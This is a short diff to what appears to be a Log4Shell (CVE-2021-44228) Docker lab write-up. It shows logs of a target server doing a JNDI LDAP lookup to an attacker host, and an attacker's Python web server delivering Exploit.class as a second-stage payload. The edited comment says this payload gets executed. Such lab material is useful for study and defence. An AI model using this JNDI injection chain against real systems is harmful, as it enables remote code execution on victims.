@@ -45,7 +45,7 @@ log4shell-dockerlab-jndi-1       | Send LDAP reference result for Exploit redire
 log4shell-dockerlab-targetweb-1  | 2021-12-12 05:01:44,345 http-nio-8080-exec-7 WARN Error looking up JNDI resource [ldap://192.168.40.128:1389/Exploit]. javax.naming.NamingException: problem generating object using object factory [Root exception is java.lang.ClassCastException: Exploit cannot be cast to javax.naming.spi.ObjectFactory]; remaining name 'Exploit'
 log4shell-dockerlab-targetweb-1  |      at com.sun.jndi.ldap.LdapCtx.c_lookup(LdapCtx.java:1092)
 
-// Attacker's web server returning Exploit.class 
+// Attacker's web server sending second stage payload to the victim web server. This will get executed.
 └─# python3 -m http.server 8888
 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
 172.20.0.3 - - [12/Dec/2021 00:01:44] "GET /Exploit.class HTTP/1.1" 200 -
